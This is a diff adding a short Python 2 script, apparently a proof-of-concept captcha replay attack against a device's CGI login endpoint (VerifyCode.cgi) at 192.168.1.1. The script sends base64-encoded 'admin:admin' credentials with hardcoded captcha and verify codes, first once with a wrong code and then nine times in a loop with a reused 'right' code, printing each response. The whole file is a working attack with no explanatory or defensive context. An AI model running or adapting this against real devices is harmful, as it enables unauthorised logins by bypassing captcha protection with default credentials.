@@ -1,0 +1,16 @@
+import httplib
+ 
+ip = "192.168.1.1"
+print "Performing captcha replay with hardcoded wrong captcha code and verify code..."
+conn = httplib.HTTPConnection(ip)
+conn.request("GET", "/cgi-bin/nobody/VerifyCode.cgi?account=YWRtaW46YWRtaW4=&captcha_code=FMUA&verify_code=FMUYyLOivRpgc HTTP/1.1")
+resp = conn.getresponse()
+print "Reading webpage..."
+print resp.read()
+print "Performing several captcha replays with hardcoded right captcha code and verify code..."
+for i in range(1, 10):
+    conn = httplib.HTTPConnection(ip)
+    conn.request("GET", "/cgi-bin/nobody/VerifyCode.cgi?account=YWRtaW46YWRtaW4=&captcha_code=FMUF&verify_code=FMUYyLOivRpgc HTTP/1.1")
+    resp = conn.getresponse()
+    print "Reading webpage..."
+    print resp.read()
